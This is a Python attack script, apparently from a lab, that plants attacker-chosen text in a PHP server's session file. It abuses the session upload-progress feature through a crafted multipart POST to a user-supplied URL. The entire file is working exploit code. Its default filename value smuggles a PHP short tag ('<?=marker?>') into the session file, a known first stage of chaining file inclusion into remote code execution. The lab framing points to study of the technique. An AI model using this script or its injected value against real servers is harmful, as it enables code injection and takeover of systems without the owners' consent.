#!/usr/bin/env python3
# Primitive 1: session.upload_progress writes the raw upload filename into the
# session file. One multipart POST; read sess_<id> afterwards to confirm.
import argparse
import sys
import urllib.request

BOUNDARY = "----labBoundary"


def build_body(progress_value, filename):
    parts = [
        f'--{BOUNDARY}',
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"',
        '', progress_value,
        f'--{BOUNDARY}',
        f'Content-Disposition: form-data; name="f"; filename="{filename}"',
        'Content-Type: application/octet-stream',
        '', 'A' * 1024,
        f'--{BOUNDARY}--', '',
    ]
    return "\r\n".join(parts).encode()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--sid", default="labdemo123")
    ap.add_argument("--marker", default="INJECTED_MARK_<?=marker?>")
    args = ap.parse_args()

    req = urllib.request.Request(
        args.url.rstrip("/") + "/session_probe.php",
        data=build_body("demo", args.marker),
        headers={"Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
                 "Cookie": f"PHPSESSID={args.sid}"},
        method="POST")
    with urllib.request.urlopen(req, timeout=15) as r:
        print(f"  POST status: {r.status}")
    print(f"  session id : {args.sid}")
    print(f"  injected filename marker: {args.marker!r}")
    print("  -> read it back:")
    print(f"     podman exec oomlab-fpm cat /var/lib/php/sessions/sess_{args.sid}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
